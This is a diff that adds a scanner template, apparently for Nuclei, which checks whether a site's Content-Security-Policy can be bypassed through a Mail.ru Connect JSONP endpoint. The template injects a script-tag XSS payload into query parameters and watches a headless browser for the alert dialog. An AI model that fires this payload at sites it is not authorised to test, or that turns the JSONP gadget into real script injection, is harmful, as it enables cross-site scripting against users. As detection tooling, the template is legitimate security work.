@@ -1,0 +1,55 @@
+id: mailru-connect-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Mail.ru Connect
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,mailru-connect
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "mail.ru"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: mailru_connect_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "mailru_connect_csp_xss == true"
+# digest: 4a0a0047304502207f5bc365bdb454af78de59043382da995e59a8b75fa009b386e2377cc0c7cdb1022100d4ef588c88f57a3fd3fe54a9f7b6eb07ce257aefcd6d85cca31a4f4af19f9d46:922c64590222798bb761d5b6d8e72950
